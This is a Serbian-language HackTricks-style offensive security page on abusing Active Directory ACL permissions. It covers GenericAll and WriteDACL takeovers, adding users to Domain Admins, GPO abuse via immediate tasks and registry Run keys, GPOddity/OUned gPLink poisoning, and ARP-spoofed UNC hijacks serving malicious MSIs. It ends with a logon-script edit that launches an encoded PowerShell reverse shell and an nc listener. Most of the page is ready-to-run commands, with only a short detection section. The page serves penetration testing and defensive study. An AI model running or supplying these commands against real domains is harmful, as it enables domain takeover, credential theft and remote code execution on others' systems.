# Zloupotreba Active Directory ACL-ova/ACE-ova

{{#include ../../../banners/hacktricks-training.md}}

**Ova stranica je uglavnom sažetak tehnika iz** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Za više detalja pogledajte originalne članke.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll prava nad korisnikom**

Ova privilegija napadaču daje potpunu kontrolu nad ciljanim korisničkim nalogom. Kada se pomoću komande `Get-ObjectAcl` potvrde prava `GenericAll`, napadač može da:

- **Promeni lozinku cilja**: Pomoću komande `net user <username> <password> /domain`, napadač može da resetuje lozinku korisnika.
- U Linuxu se isto može uraditi preko SAMR-a pomoću Samba komande `net rpc`:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Ako je nalog onemogućen, uklonite UAC zastavicu**: `GenericAll` omogućava uređivanje atributa `userAccountControl`. U Linuxu, BloodyAD može da ukloni zastavicu `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Dodelite SPN korisničkom nalogu da biste ga učinili podložnim za Kerberoasting, a zatim upotrebite Rubeus i targetedKerberoast.py da biste izvukli hash-eve TGT-a i pokušali da ih razbijete.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Onemogućite pre-autentifikaciju za korisnika, čime njegov nalog postaje ranjiv na ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Sa pravom `GenericAll` nad korisnikom možete da dodate akreditive zasnovane na sertifikatu i da se autentifikujete kao taj korisnik bez promene njegove lozinke. Pogledajte:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Prava GenericAll nad grupom**

Ova privilegija omogućava napadaču da manipuliše članstvom u grupi ako ima prava `GenericAll` nad grupom kao što je `Domain Admins`. Nakon što identifikuje razlikovno ime grupe pomoću `Get-NetGroup`, napadač može da:

- **Doda sebe u grupu Domain Admins**: To se može uraditi direktnim komandama ili pomoću modula kao što su Active Directory ili PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Iz Linuxa takođe možete iskoristiti BloodyAD da biste se dodali u proizvoljne grupe kada imate GenericAll/Write članstvo nad njima. Ako je ciljna grupa ugnježđena u grupu „Remote Management Users“, odmah ćete dobiti WinRM pristup hostovima koji prihvataju tu grupu:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write on Computer/User**

Posedovanje ovih privilegija nad računarskim objektom ili korisničkim nalogom omogućava:

- **Kerberos Resource-based Constrained Delegation**: Omogućava preuzimanje kontrole nad računarskim objektom.
- **Shadow Credentials**: Korišćenje ove tehnike za lažno predstavljanje kao računarski ili korisnički nalog iskorišćavanjem privilegija za kreiranje shadow credentials.

## **WriteProperty on Group**

Ako korisnik ima prava `WriteProperty` nad svim objektima za određenu grupu (npr. `Domain Admins`), može da:

- **Doda sebe u grupu Domain Admins**: To se može postići kombinovanjem komandi `net user` i `Add-NetGroupUser`, čime se omogućava eskalacija privilegija unutar domena.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) nad grupom**

Ova privilegija omogućava napadačima da dodaju sebe u određene grupe, kao što je `Domain Admins`, pomoću komandi koje direktno manipulišu članstvom u grupama. Korišćenjem sledećeg niza komandi moguće je dodati sebe:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Slična privilegija omogućava napadačima da se direktno dodaju u grupe izmenom njihovih svojstava, ako imaju pravo `WriteProperty` nad tim grupama. Provera i iskorišćavanje ove privilegije obavljaju se pomoću:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Posedovanje prava `ExtendedRight` nad korisnikom za `User-Force-Change-Password` omogućava resetovanje lozinke bez poznavanja trenutne lozinke. Provera ovog prava i njegovo iskorišćavanje mogu se obaviti pomoću PowerShell-a ili alternativnih alata komandne linije, koji nude nekoliko načina za resetovanje korisničke lozinke, uključujući interaktivne sesije i one-liners za neinteraktivna okruženja. Komande se kreću od jednostavnih PowerShell poziva do korišćenja alata `rpcclient` na Linux-u, što pokazuje raznovrsnost vektora napada.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner nad grupom**

Ako napadač otkrije da ima prava `WriteOwner` nad grupom, može da promeni vlasnika grupe i postavi sebe za vlasnika. Ovo je posebno značajno kada je reč o grupi `Domain Admins`, jer promena vlasništva omogućava širu kontrolu nad atributima i članstvom grupe. Postupak podrazumeva pronalaženje odgovarajućeg objekta pomoću `Get-ObjectAcl`, a zatim korišćenje `Set-DomainObjectOwner` za promenu vlasnika, navođenjem SID-a ili imena.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite nad korisnikom**

Ova dozvola omogućava napadaču da izmeni svojstva korisnika. Konkretno, uz pristup `GenericWrite`, napadač može da promeni putanju do skripte za prijavljivanje korisnika kako bi se zlonamerna skripta izvršila prilikom korisnikovog prijavljivanja. To se postiže korišćenjem komande `Set-ADObject` za ažuriranje svojstva `scriptpath` ciljnog korisnika tako da pokazuje na skriptu napadača.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Uži `WriteProperty` ACE ograničen na korisnikov atribut [`scriptPath`](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) može biti dovoljan; `GenericWrite` nije potreban. Kombinujte to pravo nad atributom sa skriptom koja može da se menja u stablu `SYSVOL\<domain>\scripts` ili `NETLOGON` domena, a zatim procenite da li će se ciljni korisnik verovatno prijaviti i pokrenuti skriptu. Skripta se izvršava u kontekstu tog korisnika prilikom prijave. Zasebno proverite efektivne AD i file/share ACL-ove; ACE sa pravom Allow koji se podudara ili direktorijum koji može da se menja sami po sebi ne potvrđuju da je ceo put dostupan.

## **GenericWrite on Group**

Uz ovu privilegiju, napadači mogu da manipulišu članstvom u grupama, na primer tako što sebe ili druge korisnike dodaju u određene grupe. Ovaj postupak obuhvata kreiranje credential objekta, njegovo korišćenje za dodavanje ili uklanjanje korisnika iz grupe i proveru promena članstva pomoću PowerShell komandi.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Iz Linuxa, Samba `net` može da dodaje/uklanja članove kada imate `GenericWrite` nad grupom (korisno kada PowerShell/RSAT nisu dostupni):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Posedovanje AD objekta i posedovanje privilegija `WriteDACL` nad njim omogućava napadaču da sebi dodeli privilegije `GenericAll` nad objektom. To se postiže manipulacijom ADSI-ja, što omogućava potpunu kontrolu nad objektom i mogućnost izmene njegovih članstava u grupama. Uprkos tome, postoje ograničenja pri pokušaju iskorišćavanja ovih privilegija pomoću cmdlet-a `Set-Acl` / `Get-Acl` iz modula Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Brzo preuzimanje preko WriteDACL/WriteOwner (PowerView)

Kada imate `WriteOwner` i `WriteDacl` nad korisničkim ili servisnim nalogom, možete preuzeti potpunu kontrolu i resetovati njegovu lozinku pomoću PowerView-a, bez poznavanja stare lozinke:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Napomene:
- Možda ćete prvo morati da promenite vlasnika u sebe ako imate samo WriteOwner:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Proverite pristup pomoću bilo kog protokola (SMB/LDAP/RDP/WinRM) nakon resetovanja lozinke.

## **Replikacija na domenu (DCSync)**

DCSync napad koristi određene dozvole za replikaciju na domenu kako bi se imitirao Domain Controller i sinhronizovali podaci, uključujući korisničke akreditive. Ova moćna tehnika zahteva dozvole kao što je `DS-Replication-Get-Changes`, koje napadačima omogućavaju da izvuku osetljive informacije iz AD okruženja bez direktnog pristupa Domain Controller-u.<sup>[[5]](#references)</sup> [**Saznajte više o DCSync napadu ovde.**](../dcsync.md)

## Delegiranje GPO-a <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegiranje GPO-a

Delegirani pristup za upravljanje Group Policy Objects (GPOs) može predstavljati značajne bezbednosne rizike. Na primer, ako su korisniku kao što je `offense\spotless` delegirana prava za upravljanje GPO-ovima, on može imati privilegije kao što su **WriteProperty**, **WriteDacl** i **WriteOwner**. Ove dozvole mogu se zloupotrebiti u zlonamerne svrhe, što se može utvrditi pomoću PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Nabrajanje dozvola za GPO

Da bi se identifikovali pogrešno konfigurisani GPO-ovi, mogu se povezati cmdlet-i iz PowerSploit-a. Tako je moguće pronaći GPO-ove kojima određeni korisnik ima dozvolu da upravlja: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Računari na koje je primenjena određena politika**: Moguće je utvrditi na koje računare se primenjuje određeni GPO, što pomaže u razumevanju obima potencijalnog uticaja. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politike primenjene na određeni računar**: Da biste videli koje se politike primenjuju na određeni računar, možete koristiti komande kao što je `Get-DomainGPO`.

**OU-ovi na koje je primenjena određena politika**: Organizacione jedinice (OU-ovi) na koje utiče određena politika mogu se identifikovati pomoću `Get-DomainOU`.

Možete koristiti i alatku [**GPOHound**](https://github.com/cogiceo/GPOHound) za nabrajanje GPO-ova i pronalaženje problema u njima.

### Zloupotreba GPO-a - New-GPOImmediateTask

Pogrešno konfigurisani GPO-ovi mogu se iskoristiti za izvršavanje koda, na primer, kreiranjem neposrednog zakazanog zadatka. To se može uraditi kako bi se korisnik dodao u grupu lokalnih administratora na pogođenim računarima, čime se značajno povećavaju privilegije:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Zloupotreba GPO-a

GroupPolicy module, ako je instaliran, omogućava kreiranje i povezivanje novih GPO-ova, kao i podešavanje preferencija, poput vrednosti registra, za izvršavanje backdoor-a na pogođenim računarima. Ovaj metod zahteva da se GPO ažurira i da se korisnik prijavi na računar kako bi se izvršio:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Zloupotreba GPO-a

SharpGPOAbuse nudi način za zloupotrebu postojećih GPO-ova dodavanjem zadataka ili izmenom postavki, bez potrebe za kreiranjem novih GPO-ova. Ovaj alat zahteva izmenu postojećih GPO-ova ili korišćenje RSAT alata za kreiranje novih pre primene izmena:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Prinudno ažuriranje smernica

Ažuriranja GPO-a obično se odvijaju na svakih 90 minuta. Da bi se taj proces ubrzao, naročito nakon uvođenja neke promene, na ciljnom računaru može se koristiti komanda `gpupdate /force` za trenutno ažuriranje smernica. Ova komanda obezbeđuje da se sve izmene GPO-a primene bez čekanja na sledeći automatski ciklus ažuriranja.

### Ispod haube

Pregledom zakazanih zadataka za određeni GPO, kao što je `Misconfigured Policy`, može se potvrditi dodavanje zadataka poput `evilTask`. Ovi zadaci se kreiraju pomoću skripti ili alata komandne linije čiji je cilj izmena ponašanja sistema ili eskalacija privilegija.

Struktura zadatka, prikazana u XML konfiguracionoj datoteci koju generiše `New-GPOImmediateTask`, sadrži pojedinosti zakazanog zadatka, uključujući komandu koja će se izvršiti i njene okidače. Ova datoteka prikazuje kako se zakazani zadaci definišu i upravljaju unutar GPO-a, pružajući način za izvršavanje proizvoljnih komandi ili skripti u okviru primene smernica.

### Korisnici i grupe

GPO-ovi omogućavaju i manipulisanje članstvom korisnika i grupa na ciljnim sistemima. Direktnim uređivanjem datoteka sa smernicama za korisnike i grupe, napadači mogu da dodaju korisnike u privilegovane grupe, kao što je lokalna grupa `administrators`. To je moguće delegiranjem dozvola za upravljanje GPO-om, što omogućava izmenu datoteka sa smernicama radi dodavanja novih korisnika ili promene članstva u grupama.

XML konfiguraciona datoteka za korisnike i grupe opisuje kako se ove promene sprovode. Dodavanjem unosa u ovu datoteku, određenim korisnicima mogu se dodeliti povišene privilegije na pogođenim sistemima. Ovaj metod omogućava direktnu eskalaciju privilegija manipulacijom GPO-om.

Za bezbednosne postavke kao što su članstvo u lokalnim grupama i korisnička prava, pregledajte i primenjeni GPO predložak na putanji `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` i ACL direktorijuma `SecEdit`. Direktorijum ili datoteka sa dozvolom za pisanje predstavljaju povod za proveru: efektivni pristup SYSVOL deljenom resursu, deny i nasleđeni ACL-ovi, dozvole kontejnera Group Policy, opseg smernica i osvežavanje na klijentu i dalje određuju da li promena može da stupi na snagu. Samo članstvo u grupi pod nazivom „GPO Managers” ne dokazuje da postoje prava za uređivanje. [Microsoft описује ову путању до предлошка и раздвајање контејнера Group Policy од предлошка.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Pored toga, mogu se razmotriti i dodatni načini za izvršavanje koda ili održavanje persistence-a, kao što su korišćenje skripti za prijavu/odjavu, izmena ključeva registratora za automatsko pokretanje, instaliranje softvera putem .msi datoteka ili uređivanje konfiguracija servisa. Ove tehnike pružaju različite mogućnosti za održavanje pristupa i kontrolu ciljnih sistema zloupotrebom GPO-a.

### Preusmeravanje GPC/GPT preuzimanja ka autentifikovanim lažnim servisima

GPO se sastoji od LDAP **Group Policy Container (GPC)** sa metapodacima i SMB-hostovanog **Group Policy Template (GPT)** sa datotekama smernica. Tokom osvežavanja, klijent prati `gPLink` kontejnera, čita referencirani GPC i njegov `gPCFileSysPath`, a zatim preuzima GPT sa te UNC putanje. Shodno tome, pristup za pisanje nad samim GPC-om ili nad `gPLink` OU-a, lokacije ili domena može se iskoristiti za obradu smernica sa privilegijama.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Trovanje `gPCFileSysPath` pomoću GPOddity

Ako kontrolisani principal može da upisuje u ciljni GPC (direktno ili putem **NTLM relay to LDAP**), zamenite `gPCFileSysPath` UNC putanjom koju hostuje napadač. [GPOddity](https://github.com/synacktiv/GPOddity) automatizuje LDAP izmenu i hostuje zlonamerni GPT koji sadrži datoteke smernica zasnovane na modulima ili Immediate Task, koju Group Policy klijent izvršava kao `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Anonimni SMB deljeni resurs ili SMB deljeni resurs koji ne proverava akreditive nije dovoljan na aktuelnim Windows klijentima: SMB Secure Negotiate zahteva dokaz da je autentifikacija uspela, pa lažni servis mora da proveri identitet domena, izvede ključ SMB sesije i ispravno potpisuje svoje odgovore. U ugrađenom režimu, konfigurišite GPOddity pomoću kontrolisanog mašinskog naloga i njegovog servisnog ključa, a zatim izaberite korisni teret za računarski ili korisnički kontekst u odeljku `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Granični slučaj korisničkog GPO-a:** nakon MS16-072, Windows i dalje uspostavlja dve SMB2 sesije u okviru **iste TCP veze**: korisnička sesija čita `GPT.INI`, a zatim sesija naloga računara čita efektivnu konfiguraciju, kao što je `ScheduledTasks.xml`. Zato lažni server mora da indeksira stanje autentifikacije, ključeve sesija i ključeve za potpisivanje prema SMB2 `SessionId`, a ne samo prema socketu. Scapy fork ugrađen u GPOddity/OUned ovo ostvaruje pomoću `SMBStreamSocketMultiplexing` i `SMBServer` podržavajućeg multipleksiranja; Impacket/Scapy serveri za jednu sesiju inače ponovo koriste pogrešno stanje za potpisivanje i ne rade ispravno sa korisničkim pravilima.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning uz OUned

Uz `WriteGPLink`, `GenericWrite` ili ekvivalentnu kontrolu nad OU, Site ili Domain, napadač može da doda vezu čiji se GPC DN poslužuje sa LDAP hosta pod kontrolom napadača. Ovu tehniku je prvobitno predstavio Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automatizuje LDAP upis i zlonamerni GPC/GPT lanac.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Žrtva se najpre autentifikuje na zlonamernom LDAP servisu i dobija GPC čiji `gPCFileSysPath` upućuje na zlonamerni SMB servis; zatim se autentifikuje na SMB i primenjuje dostavljeni GPT. OUned-u je zato potreban nalog sa LDAP SPN-om, mašinski nalog sa HOST SPN-om za SMB (isti mašinski nalog može da zadovolji oba uslova) i DNS rezolucija ili povratno prosleđivanje koje usmerava portove 389 i 445 ka hostu operatera.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned-ov ugrađeni Scapy LDAP server proverava Kerberos/SPNEGO koristeći stvarni ključ kontrolisane usluge i pruža proizvoljne GPC podatke iz JSON-a. Prazan JSON ključ modeluje rootDSE, prefiksi `base64:` predstavljaju binarne vrednosti, a server podržava add/delete/modify/search, kao i pretrage `BASE`, `LEVEL` i `SUBTREE`; može da pregovara bez zaštite, uz integritet ili uz poverljivost. Zbog toga se usluga može ponovo koristiti kada neka druga Windows komponenta prati LDAP referencu koju kontroliše napadač, ali zahteva autentifikovani LDAP.<sup>[[15]](#references)</sup>

Nemojte pretpostaviti da sinhronizacija lozinke naloga u lažni domen reprodukuje svaki Kerberos ključ: RC4 se izvodi iz lozinke, dok AES string-to-key koristi i salt izveden iz hostname-a/domena principal-a. Dostavljanje stvarnog AES ključa naloga u `KerberosSSP` izbegava forsiranje RC4 kroz uočljivu promenu `msDS-SupportedEncryptionTypes` naloga mašine koje može sam da menja.<sup>[[15]](#references)</sup>

#### Tačke za detekciju

Povežite promene u `gPCFileSysPath` ili `gPLink` sa promenama verzije GPO-a i novim XML fajlovima za Immediate/Scheduled Task. Istražite veze ka neočekivanim naming context-ima, UNC hostove izvan odobrenog skupa DC/SYSVOL, DNS zapise koji preusmeravaju imena naloga mašina, servisne tikete LDAP/CIFS za neuobičajene naloge mašina i promene u `msDS-SupportedEncryptionTypes` koje omogućavaju RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + otmica UNC putanje (ARP spoofing)

`WriteGPLink` nad OU/domenom omogućava izmenu atributa `gPLink` ciljnog kontejnera i **nametanje primene postojećeg GPO-a** bez uređivanja samog GPO-a. Ovo postaje zanimljivo kada povezani GPO već upućuje na udaljeni sadržaj preko **UNC putanja** (`\\HOST\share\...`), jer autentifikovani korisnici mogu da čitaju **SYSVOL** i da van mreže traže politike koje se mogu ponovo iskoristiti.<sup>[[11]](#references)</sup>

Tok rada na visokom nivou:

1. Pomoću BloodHound-a pronađite principal sa dozvolom `WriteGPLink` nad OU-om i nabrojte računare/korisnike unutar tog OU-a.
2. Napravite kopiju `SYSVOL` samo za čitanje i raščlanite GPO-ove, tražeći **Software Installation**, **mapiranja diskova** (`Drives.xml`) i **logon/startup skripte** koje upućuju na UNC putanje.
3. Dajte prednost politikama koje upućuju na **direktni hostname** (na primer `\\DC02\share\pkg.msi`) umesto na putanje DFS/domain-namespace, jer je hostname putanje lakše preusmeriti L2 spoofing-om.
4. Dodajte GUID izabranog GPO-a u `gPLink` ciljnog OU-a kako bi žrtva obradila tu već postojeću politiku.
5. Na istom broadcast domenu, izvršite ARP spoofing UNC hosta i lokalno povežite njegov IP (`ip addr add <target_ip>/32 dev <iface>`) kako bi SMB saobraćaj žrtve stigao do vašeg hosta.
6. Poslužite očekivanu putanju/ime fajla sa SMB servera napadača (na primer `smbserver.py`) i sačekajte uobičajenu obradu politike.

Primer prikupljanja `SYSVOL` sadržaja i povezivanja sa GPO-ima:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Povežite postojeći GPO sa ciljnom OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Ako povezani GPO instalira MSI sa UNC putanje, klijent će ga preuzeti tokom **pokretanja računara** i instalirati kao **`NT AUTHORITY\SYSTEM`**. Lažiranjem navedenog hosta i posluženjem zlonamernog MSI-ja pod **istim deljenim resursom/putanjom/nazivom**, možete pretvoriti `WriteGPLink` u izvršavanje koda kao SYSTEM **bez menjanja SYSVOL-a**.

Važna ograničenja:

- **Vreme je važno**: nova veza se vidi pri osvežavanju smernica (obično na svakih ~90 minuta), ali se **Software Installation** obično pokreće pri **ponovnom pokretanju**.
- Windows Installer obično prati instalaciju pomoću **`ProductCode`** paketa. Ako je proizvod već instaliran, instalacija može biti preskočena.
- Da biste izbegli odbijanje instalacije, izmenite lažni MSI tako da se njegovi **`ProductCode`** i **`PackageCode`** podudaraju sa legitimnim paketom koji GPO očekuje.
- Stare `.aas` datoteke za oglašavanje mogu ostati u `SYSVOL`-u, zato proverite da li instalacija i dalje izgleda aktivno pre nego što se oslonite na nju.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

GPP mapiranja diskova u `Drives.xml` navode korisnike da se tokom prijavljivanja ili ponovnog povezivanja autentifikuju na konfigurisanu UNC putanju. Ako lažirate navedeni host, možete uhvatiti **NetNTLMv2**. Ako namerno izazovete neuspeh SMB-a, Windows može pokušati ponovo preko **WebDAV-a** i poslati **NTLM preko HTTP-a**, što pruža mnogo više mogućnosti za relay ka **LDAP(S)**, **AD CS** ili **SMB**.

#### Logon/startup script UNC hijack

Isti obrazac važi i za skripte hostovane na UNC putanjama koje se pronađu u `SYSVOL`:

- **Logon skripte** se obično izvršavaju u kontekstu **korisnika**.
- **Startup skripte** se obično izvršavaju u kontekstu **računara / SYSTEM**.

Ako putanja do skripte upućuje na hostname koji je moguće lažirati, preusmerite UNC host i poslužite izmenjeni sadržaj skripte sa očekivane lokacije.

## SYSVOL/NETLOGON Logon Script Poisoning

Putanje sa dozvolom za upis u `\\<dc>\SYSVOL\<domain>\scripts\` ili `\\<dc>\NETLOGON\` omogućavaju izmenu logon skripti koje se izvršavaju prilikom korisničkog prijavljivanja putem GPO-a. To omogućava izvršavanje koda u bezbednosnom kontekstu korisnika koji se prijavljuju.

### Lociranje logon skripti
- Pregledajte korisničke atribute da biste pronašli konfigurisanu logon skriptu:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Pregledajte deljene resurse domena da biste otkrili prečice ili reference ka skriptama:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Parsirajte `.lnk` fajlove da biste utvrdili odredišta koja vode u SYSVOL/NETLOGON (koristan DFIR trik za napadače bez direktnog pristupa GPO-u):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound prikazuje atribut `scriptPath` objekta korisnika za logon skriptu, ako postoji. Logon skripte konfigurisane preko GPO-a predstavljaju zasebnu referencu na pravilo, pa pregledajte i primenljivi GPO.

### Proverite pristup za upis (ne oslanjajte se na listing deljenih resursa)
Automatizovani alati mogu prikazati SYSVOL/NETLOGON kao samo za čitanje čak i kada tačna skripta ima drugačiji NTFS ACL. Počnite pregledom te datoteke i njenog nadređenog direktorijuma samo za čitanje; odgovarajuće Allow ACE stavke i dalje mogu biti relevantne, jer su bitni efektivni SMB i NTFS pristup, Deny ACE stavke i trenutni token:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Test upisivanja uz odobrenje treba da bude specifičan za cilj i reverzibilan, uz prethodno pravljenje rezervne kopije originalne skripte i njeno vraćanje nakon testa. Nemojte prepisivati funkcionalnu skriptu za prijavu samo da biste testirali pristup; uspešan upis može da se izvrši pri sledećoj prijavi korisnika.

### Izmenite VBScript skriptu za prijavu radi RCE
Dodajte komandu koja pokreće PowerShell reverse shell (generišite ga na revshells.com) i sačuvajte originalnu logiku da biste izbegli narušavanje poslovnih funkcija:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Slušajte na svom hostu i sačekajte sledeću interaktivnu prijavu:

```bash
rlwrap -cAr nc -lnvp 443
```

Beleške:
